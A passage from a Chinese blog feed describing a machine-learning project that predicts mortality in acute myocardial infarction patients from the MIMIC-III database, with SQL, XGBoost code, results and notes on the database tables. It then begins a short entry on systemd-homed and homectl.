<p>然后用找患者检查项目、生理指标的ITEM_ID。写一个简单的SQL联接查询就可以了：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">DISTINCT</span>
	SUBJECT_ID<span class="token punctuation">,</span>
	<span class="token function">MAX</span><span class="token punctuation">(</span>VALUEUOM<span class="token punctuation">)</span> MAX_VALUE<span class="token punctuation">,</span>
	<span class="token function">MIN</span><span class="token punctuation">(</span>VALUEUOM<span class="token punctuation">)</span> MIN_VALUE
<span class="token keyword">FROM</span>
	<span class="token punctuation">(</span>
	<span class="token keyword">SELECT</span>
		CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span><span class="token punctuation">`</span><span class="token keyword">VALUE</span><span class="token punctuation">`</span><span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>VALUEUOM<span class="token punctuation">,</span>
		CHARTEVENTS<span class="token punctuation">.</span>ERROR<span class="token punctuation">,</span>
		TIMESTAMPDIFF<span class="token punctuation">(</span> <span class="token keyword">HOUR</span><span class="token punctuation">,</span> T<span class="token punctuation">.</span>INTIME<span class="token punctuation">,</span> CHARTEVENTS<span class="token punctuation">.</span>CHARTTIME <span class="token punctuation">)</span> STAYHOUR 
	<span class="token keyword">FROM</span>
		CHARTEVENTS<span class="token punctuation">,</span>
		A_AKF_DEATH T 
	<span class="token keyword">WHERE</span>
		CHARTEVENTS<span class="token punctuation">.</span>ICUSTAY_ID <span class="token operator">=</span> T<span class="token punctuation">.</span>ICUSTAY_ID 
		<span class="token operator">AND</span> <span class="token punctuation">(</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">220546</span> <span class="token operator">OR</span> CHARTEVENTS<span class="token punctuation">.</span>ITEMID <span class="token operator">=</span> <span class="token number">1542</span> <span class="token punctuation">)</span>
	<span class="token keyword">ORDER</span> <span class="token keyword">BY</span>
		CHARTEVENTS<span class="token punctuation">.</span>SUBJECT_ID 
	<span class="token punctuation">)</span> AA
<span class="token keyword">WHERE</span>
	STAYHOUR <span class="token operator">&lt;=</span> <span class="token number">24</span> 
<span class="token keyword">GROUP</span> <span class="token keyword">BY</span>
	SUBJECT_ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本次选取的急性心肌梗死患者主要特征见下表：</p>
<table>
<thead>
<tr class="header">
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr class="even">
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr class="odd">
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr class="even">
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr class="odd">
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr class="even">
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr class="odd">
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr class="even">
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr class="odd">
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr class="even">
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr class="odd">
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr class="even">
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr class="odd">
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr class="even">
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE =200XX-208XX</td>
</tr>
<tr class="odd">
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr class="even">
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr class="odd">
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody>
</table>
<h3 id="归一化和标准化">归一化和标准化</h3>
<p>为了将患者特征转换成便于机器学习模型输入训练的特征变量的形式，对于MIMIC数据库中患者初次入院24小时中多次测量并记录的化验指标，选取最小值、最大值和平均值作为三个不同的特征。</p>
<p>然后对数字变量进行归一化，把标准差置为1，均值置为零（ICD细分编码之类的虽然是数字，但实际上是一个类别特征，应作为类别特征处理）</p>
<p>对于性别种族等类别特征，进行Onehot编码转换为梯度提升树模型能够接受的类型；以性别为例，将性别为女编码为01，性别为男编码为10。（LightGBM等可以用直方图算法之类的方式直接处理类别特征，不需要该操作）经过上述处理，共筛选并构建出42个急性心肌梗死患者的特征维度。</p>
<h3 id="缺失值填补">缺失值填补</h3>
<p>由于MIMIC数据库中的数据是由两家不同的医院在10年间的ICU重症监护记录整合而成，急性心肌梗死患者的数据存在缺失和不统一的问题。以化验项目血清碳酸氢水平为例，在提取得到的4788份急性心肌梗死患者样本数据中，有4730份血清碳酸氢数据记录是完整的，有58份是缺失的，缺失率1.2%；但是部分检查指标，如收缩压，4788个样本中只有2665份完整数据，缺失率44.3%。</p>
<p>对于SVM等对于缺失值敏感的算法，用均值填补空缺数据的方法；对于缺失值不敏感的决策树类算法（如GBDT）和自带缺失值处理的算法（如XGBoost），将缺失值置为-1。</p>
<p>（缺失率在40%左右的会影响模型的效果，但是收缩压之类的又很重要，不能轻易舍弃）</p>
<figure>
<img src="/morality-prediction/image-20200603192151696.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="数据集不平衡的问题">数据集不平衡的问题</h3>
<p>有的疾病可能会有，急性心肌梗死由于死亡率很高，正负样本比例已经超过了1：9，并不是那种极端不平衡的问题。有的疾病死亡率1%左右需要采样等方式构造平衡数据集。</p>
<h2 id="模型训练">模型训练</h2>
<p>直接用的scikit-learn工具包，随便调了调参。决策树类的bsoosting算法表现都还不错，像GBDT啊，XGBoost啊，LightGBM啊。数据量还是有点小了，就没上深度学习那些网络。直接调sklearn的包调一下参：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
<span class="token comment"># pd.options.mode.chained_assignment = None</span>
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">import</span> lightgbm <span class="token keyword">as</span> lgb


<span class="token keyword">from</span> sklearn <span class="token keyword">import</span> preprocessing
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>model_selection <span class="token keyword">import</span> train_test_split<span class="token punctuation">,</span>cross_val_score<span class="token punctuation">,</span>cross_val_predict
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>ensemble <span class="token keyword">import</span> RandomTreesEmbedding<span class="token punctuation">,</span> RandomForestClassifier<span class="token punctuation">,</span> GradientBoostingClassifier
<span class="token comment"># criteria</span>
<span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>metrics <span class="token keyword">import</span> accuracy_score<span class="token punctuation">,</span> roc_auc_score<span class="token punctuation">,</span> f1_score<span class="token punctuation">,</span>recall_score<span class="token punctuation">,</span> precision_score<span class="token punctuation">,</span> roc_curve


<span class="token comment"># 加载数据</span>
data <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_csv<span class="token punctuation">(</span><span class="token string">'./data/train_data_modified.csv'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> data<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>frac<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> random_state<span class="token operator">=</span><span class="token number">42</span><span class="token punctuation">)</span>
data_x <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">41</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token comment"># data_x = data.iloc[:,[1,2,3,4,5,6,7,36]]</span>
lbl <span class="token operator">=</span> preprocessing<span class="token punctuation">.</span>LabelEncoder<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># data_x['M'] = lbl.fit_transform(data_x['M'].astype(str))#将含有字符的类别特征这一列进行转换</span>
<span class="token comment"># data_x['EMERGENCY'] = lbl.fit_transform(data_x['EMERGENCY'].astype(str))#将含有字符的类别特征这一列进行转换</span>
data_y <span class="token operator">=</span> data<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># 准备一个train/test来构建模型。</span>
x_train<span class="token punctuation">,</span> x_test<span class="token punctuation">,</span> y_train<span class="token punctuation">,</span> y_test <span class="token operator">=</span> train_test_split<span class="token punctuation">(</span>data_x<span class="token punctuation">,</span>
                                                    data_y<span class="token punctuation">,</span> 
                                                    test_size<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">,</span> 
                                                    random_state<span class="token operator">=</span><span class="token number">52</span><span class="token punctuation">,</span>
                                                    <span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>x_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> x_test<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_train<span class="token punctuation">.</span>shape<span class="token punctuation">,</span> y_test<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>


<span class="token keyword">from</span> xgboost<span class="token punctuation">.</span>sklearn <span class="token keyword">import</span> XGBClassifier
xgb <span class="token operator">=</span> XGBClassifier<span class="token punctuation">(</span>
    n_estimators<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>
    learning_rate <span class="token operator">=</span><span class="token number">0.09</span><span class="token punctuation">,</span>
    max_depth<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>
    min_child_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    gamma<span class="token operator">=</span><span class="token number">0.3</span><span class="token punctuation">,</span>
    subsample<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>
    colsample_bytree<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>
    objective<span class="token operator">=</span> <span class="token string">'binary:logistic'</span><span class="token punctuation">,</span>
    nthread<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>
    scale_pos_weight<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    reg_lambda<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
    seed<span class="token operator">=</span><span class="token number">27</span><span class="token punctuation">)</span>
<span class="token comment"># xgb = HistGradientBoostingClassifier(learning_rate=0.09)</span>
xgb<span class="token punctuation">.</span>fit<span class="token punctuation">(</span>x_train<span class="token punctuation">,</span> y_train<span class="token punctuation">)</span>

y_pred_xgb <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span>


y_pred_xgb_pr <span class="token operator">=</span> xgb<span class="token punctuation">.</span>predict_proba<span class="token punctuation">(</span>x_test<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
fpr_xgb<span class="token punctuation">,</span>tpr_xgb<span class="token punctuation">,</span>thresholds  <span class="token operator">=</span> roc_curve<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span>y_pred_xgb_pr<span class="token punctuation">)</span>

<span class="token comment"># y_pred_xgb = y_pred_xgb_pr > 0.5</span>
<span class="token comment"># print(lr.coef_) #W</span>
<span class="token comment"># print(lr.intercept_) #b</span>
<span class="token comment"># 评价指标</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"auc面积:"</span><span class="token punctuation">,</span>roc_auc_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb_pr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"精确率:"</span><span class="token punctuation">,</span>precision_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"召回率:"</span><span class="token punctuation">,</span>recall_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正确率:"</span><span class="token punctuation">,</span>accuracy_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"F1值:"</span><span class="token punctuation">,</span>f1_score<span class="token punctuation">(</span>y_test<span class="token punctuation">,</span> y_pred_xgb<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="死亡率预测">死亡率预测</h2>
<h3 id="结果">结果</h3>
<p>表3-3 几种机器学习方法的死亡率预测结果如下表：</p>
<table>
<thead>
<tr class="header">
<th></th>
<th>GBDT</th>
<th>LR</th>
<th>KNN</th>
<th>SVM</th>
<th>XGBoost</th>
<th>LightGBM</th>
<th>NB</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>AUC</td>
<td>0.834</td>
<td>0.780</td>
<td>0.695</td>
<td>0.779</td>
<td>0.851</td>
<td>0.844</td>
<td>0.777</td>
</tr>
<tr class="even">
<td>精确率</td>
<td>0.676</td>
<td>0.618</td>
<td>0.5</td>
<td>0.688</td>
<td>0.690</td>
<td>0.663</td>
<td>0.378</td>
</tr>
<tr class="odd">
<td>召回率</td>
<td>0.320</td>
<td>0.239</td>
<td>0.162</td>
<td>0.155</td>
<td>0.329</td>
<td>0.330</td>
<td>0.479</td>
</tr>
<tr class="even">
<td>准确率</td>
<td>0.879</td>
<td>0.865</td>
<td>0.852</td>
<td>0.864</td>
<td>0.875</td>
<td>0.872</td>
<td>0.806</td>
</tr>
<tr class="odd">
<td>F1 值</td>
<td>0.451</td>
<td>0.345</td>
<td>0.245</td>
<td>0.253</td>
<td>0.443</td>
<td>0.439</td>
<td>0.422</td>
</tr>
</tbody>
</table>
<p>看上去准确率挺高，实际结果不太好，召回率太低了。召回率的意义是真阳性率（True Positive Rate），也就是预测到的死亡患者占所有患者的比例，大概真正死亡的患者只有一半被预测了出来。</p>
<table>
<thead>
<tr class="header">
<th></th>
<th>实际死亡</th>
<th>实际存活</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>预测死亡</td>
<td>真阳性（TP）</td>
<td>假阳性（FP）</td>
</tr>
<tr class="even">
<td>预测存活</td>
<td>假阴性（FN）</td>
<td>真阴性（TN）</td>
</tr>
</tbody>
</table>
<p>由于数据集还是太小，就没有细分搞成多分类的问题预测一下短期（30天）和长期（90天以上）死亡率，数据集大了可以做一下。数据集再大可以做细分，比如STEMI和NSTEMI的细分或者</p>
<h3 id="roc曲线">ROC曲线</h3>
<figure>
<img src="/morality-prediction/image-20200531203632378.png" alt="几种机器学习方法的ROC曲线" /><figcaption aria-hidden="true">几种机器学习方法的ROC曲线</figcaption>
</figure>
<h3 id="特征权重">特征权重</h3>
<p>以GBDT为例，提取训练模型的决策树权重，结果如图3-3所示。由图可知，梯度提升树模型认为最重要的10个指标为当日最小血清碳酸氢水平、平均动脉血二氧化碳分压、平均排尿量、心率范围、最小心率、肌酐、体温范围、当日最大收缩压、当日心率标准差、年龄。</p>
<figure>
<img src="/morality-prediction/image-20200531210528257.png" alt="GBDT的特征权重" /><figcaption aria-hidden="true">GBDT的特征权重</figcaption>
</figure>
<h2 id="其他问题">其他问题</h2>
<p>这个，急性心肌梗死这个直接看心电图或者彩超啥的更好一些，准确率一般不会低于90%。心血管疾病这种做这个预测基本没有太大意义。急性肾衰竭啥的可能更有意义一点</p>
<p>MIMIC数据库里面的数据亚裔很少，放到国内可能不太合适。护理和临床记录方式也差别不小。</p>
<p>这是2001-2012年的数据，近十年来医学水平提高了不少，包括再灌注等手段，死亡率已经下降了，用这批数据预测现在的可能会偏高</p>
<h2 id="补充说明">补充说明</h2>
<h3 id="mimic数据库表格名称及用途">MIMIC数据库表格名称及用途</h3>
<table>
<colgroup>
<col style="width: 20%" />
<col style="width: 53%" />
<col style="width: 26%" />
</colgroup>
<thead>
<tr class="header">
<th>表格名称</th>
<th>表格内容</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ADMISSIONS（入院表）</td>
<td>提供有关患者的入院信息，由于为病人进行的每次唯一的医院访问都分配了一个唯一的信息<code>HADM_ID</code>，因此ADMISSIONS表可以被认为是<code>HADM_ID</code></td>
<td></td>
</tr>
<tr class="even">
<td>CALLOUT(标注表)</td>
<td>提供患者何时准备好从ICU出院以及患者何时实际从ICU出院的信息</td>
<td></td>
</tr>
<tr class="odd">
<td>caregivers</td>
<td>记录医护人员信息（ID、类型、附加信息）</td>
<td></td>
</tr>
<tr class="even">
<td>chartevents</td>
<td>记录所有病人的图表数据，住院期间的所有症状、体征、精神状态、实验室检查等</td>
<td></td>
</tr>
<tr class="odd">
<td>cptevents</td>
<td>包含当前的程序术语（CPT）代码，这些代码便于为在患者身上执行的操作计费。</td>
<td></td>
</tr>
<tr class="even">
<td>d_cpt</td>
<td>当前程序术语（CPT）代码的高级定义</td>
<td></td>
</tr>
<tr class="odd">
<td>prescriptions（处方）</td>
<td>包含药物相关的订单条目，即处方</td>
<td></td>
</tr>
<tr class="even">
<td>inputevents_cv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源CareVue ICU数据库。</td>
</tr>
<tr class="odd">
<td>inputeevents_mv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源Metavision ICU数据库。</td>
</tr>
<tr class="even">
<td>outputevent</td>
<td>患者的输出数据。</td>
<td></td>
</tr>
<tr class="odd">
<td>labevents</td>
<td>包含给定患者的所有实验室测量值，包括患者数据（ITEMID、VALUE）</td>
<td></td>
</tr>
<tr class="even">
<td>d_icd_diagnoses</td>
<td>ICD-9疾病诊断的定义表,对 疾病编码的解释</td>
<td></td>
</tr>
<tr class="odd">
<td>d_icd_procedures</td>
<td>ICD-9治疗程序代码的解释</td>
<td></td>
</tr>
<tr class="even">
<td>d_items</td>
<td>ICU数据库中所有项目的定义表</td>
<td></td>
</tr>
<tr class="odd">
<td>d_labitems</td>
<td>所有实验室测量的定义表（对ITEMID的解释，对应数据类型，关联的LOINC代码）</td>
<td></td>
</tr>
<tr class="even">
<td>datetimeevents</td>
<td>包含所有日期格式的数据</td>
<td></td>
</tr>
<tr class="odd">
<td>diagnoses_icd（诊断表）</td>
<td>包含患者住院期间所有ICD-9诊断</td>
<td></td>
</tr>
<tr class="even">
<td>drgcodes</td>
<td>包含患者的诊断相关组（DRG）代码</td>
<td></td>
</tr>
<tr class="odd">
<td>icustays</td>
<td>患者在ICU内的住院概要（入住或者转出ICU的时间等）</td>
<td></td>
</tr>
<tr class="even">
<td>microbiologyevents</td>
<td>包含微生物学信息，包括进行的测试和敏感性</td>
<td></td>
</tr>
<tr class="odd">
<td>noteevents</td>
<td>包含所有患者注意事项。，主要是不便于数字化的报告</td>
<td></td>
</tr>
<tr class="even">
<td>patients</td>
<td>包含患者的基本信息（性别、出生日期、死亡日期、死亡标志位）</td>
<td></td>
</tr>
<tr class="odd">
<td>procedureevents_mv</td>
<td>包含患者的（治疗）程序</td>
<td></td>
</tr>
<tr class="even">
<td>procedures_icd</td>
<td>包含患者的ICD程序，最值得注意的是ICD-9程序，即诊断程序</td>
<td></td>
</tr>
<tr class="odd">
<td>services</td>
<td>患者被接纳/转移的服务</td>
<td></td>
</tr>
<tr class="even">
<td>transfers</td>
<td>患者整个住院期间的物理位置</td>
<td></td>
</tr>
</tbody>
</table>
<p>注意： 表格主要分为两种，一种是以D开头的，表示该表格为字典，比如d_labitems，表示实验室检查字典，内含每个实验室检查结果的说明；没有以D打头的表格则是记录患者信息的表格，比如labevents则表示患者住院期间的所有实验室检查结果。</p>
<h3 id="mimic数据表中主要字段">MIMIC数据表中主要字段</h3>
<table>
<thead>
<tr class="header">
<th>数据表</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ADMISSION</td>
<td>SUBJECT_ID</td>
<td>每个患者的唯一标识</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>HADM_ID</td>
<td>患者每次入院的唯一标识</td>
</tr>
<tr class="odd">
<td>ADMISSION</td>
<td>ADMITTIME</td>
<td>入院时间</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>DEATHTIME</td>
<td>死亡时间</td>
</tr>
<tr class="odd">
<td>DIAGNOSES_ICD</td>
<td>ICD9_CODES</td>
<td>患者的ICD-9编码</td>
</tr>
<tr class="even">
<td>ADMISSION</td>
<td>HOSPITAL_EXPIRE_FLAG</td>
<td>是否死亡</td>
</tr>
<tr class="odd">
<td>D_ITEMS</td>
<td>ITEMID</td>
<td>项目编号</td>
</tr>
<tr class="even">
<td>D_ITEMS</td>
<td>LEABEL</td>
<td>项目名称</td>
</tr>
<tr class="odd">
<td>ICUSTAYS</td>
<td>ICUSTAY_ID</td>
<td>每次ICU病房接受病人唯一标识</td>
</tr>
<tr class="even">
<td>LABEVENTS</td>
<td>VALUE</td>
<td>检查项目</td>
</tr>
<tr class="odd">
<td>LABEVENTS</td>
<td>VALUEUOM</td>
<td>ITEM的值 检查项目的单位（如K/uL）</td>
</tr>
<tr class="even">
<td>LABEVENT</td>
<td>FLAG</td>
<td>检查项目是否异常（正常为Null）</td>
</tr>
</tbody>
</table>
<h3 id="急性心肌梗死患者主要特征">急性心肌梗死患者主要特征</h3>
<table>
<thead>
<tr class="header">
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr class="even">
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr class="odd">
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr class="even">
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr class="odd">
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr class="even">
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr class="odd">
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr class="even">
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr class="odd">
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr class="even">
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr class="odd">
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr class="even">
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr class="odd">
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr class="even">
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE =200XX-208XX</td>
</tr>
<tr class="odd">
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr class="even">
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr class="odd">
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody>
</table>
<h3 id="注意事项">注意事项</h3>
<ul>
<li>MIMIC IIII 数据库中用于识别患者身份的字段共有3个：subjects_id，hadm_id和icustay_id。其中subjects_id是患者身份的唯一标识，即一个subject_id只对应一名患者，一名患者也只有一个subject_id。hadm_id是患者每次住院的身份识别号，一个患者可能多次住院，因此一个subjects_id会对应多个hadm_id，但一个hadm_id只能对应一个subject_id。icustay_id表示患者在进入ICU的编号，因为患者一次住院可以多次进入不同的ICU，因此一个icustay_id只能对应一个hadm_id，当然也只能对应一个subject_id，但一个hadm_id可以对应多个icustay_id。在利用 MIMIC III 数据库进行研究时，往往需要运用sql语言对多个数据库进行连接，连接的基础一般就是这三个字段。</li>
<li>患者的临床资料不一定是住ICU期间的临床资料，也可能是住普通病房时的资料。记录患者入院时间的表格为admission，内含三个时间点：admittime，表示患者入院时间；dischartime，表示患者出院时间；deathtime，表示患者院内死亡的时间。如果deathtime为空(null)，则表示患者住院期间未死亡。记录患者进入和离开ICU的表格为icustays，这个表格中有两个时间较为重要，分别是intime和outtime，前者表示进入ICU的时间，后者表示离开ICU的时间。当然，如果患者在ICU死亡，那么dischartime、outtime和deathtime理论上就是同一个时间，但实际上会稍微有些出入，估计是由于录入不及时造成的；</li>
<li>MIMIC III 中的数据来自于两套数据采集系统：carevue和metavision。在icustays表格中，有一个字段叫dbsource，用于标识数据是来源于carevue还是metavision。CareVue记录的是2001至2008年入院的患者资料，Metavision则是2008至2012年期间入院的患者资料。在Metavision中，病人的随访时间最少为90天，在CareVue中，病人的随访时间则至少为4年。换而言之，在进行预后研究时，如果将数据来源限定为CareVue，则可以将随访时间假定为4年，对于4年以后死亡的患者，可以将其在出院后第4年生存状况定义为“存活”。当然，如果患者的死亡状况(DOD_SSN)为空格(null)，也同样可以表明患者在出院后4年仍然存活。</li>
<li>MIMIC数据库中的ICD编码统计方式和国内不太一样，基本都包含并发症，比如一个病人流感入院并死亡，同时患有急性心肌梗死的并发症，那么该病人也算作急性心肌梗死患者。（主要诊断是其他的疾病，但同时患有某疾病并发症，也认为是该疾病患者，统计死亡时也算在里面）</li>
<li>在MIMIC中有一个'ADMISSION_TYPE，其中有3个类别，分别是URGENT，EMERGENCY和ELECTIVE，ELECTIVE是不紧急的，URGENT和EMERGENCY的区别大概是URGENT的紧急程度更高（一般是需要立即采取措施的那种）</li>
</ul>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>MIMIC</tag>
      </tags>
  </entry>
  <entry>
    <title>systemd-homed简介(homectl设置用户、用户组)</title>
    <url>/systemd-homed/</url>
    <content><![CDATA[<p>在2020.3 发布的systemd 245增加了systemd-homed，改变了<code>/home</code>目录的加密和工作方式。用homectl设置用户组，直接加密整个<code>/home</code>目录更方便了，快来当小白鼠吧。 <span id="more"></span></p>
<h2 id="太长不看版">太长不看版</h2>
<h3 id="使用homectl新建用户用户组">使用homectl新建用户、用户组</h3>
<p>首先你的systemd要在245以后，版本较低或使用SysV或者OpenRC、Upstart的玩家请跳过。</p>
<p>更新：systemd-247以后的版本默认采用Btrfs，还加了一个可选的恢复密码（recovery key），你的密钥丢了可以用这个重置</p>
<p>homectl是systemd-homed.service的一个cli工具，用来配置用户组、用户，包括新建、删除、修改权限和密码等。考虑到systemd近乎一统江湖的的市场占有率，可能你们将不得不面对这种方式。</p>
<p>没开启的先开启一下<code>systemd-homed.service</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> systemd-homed
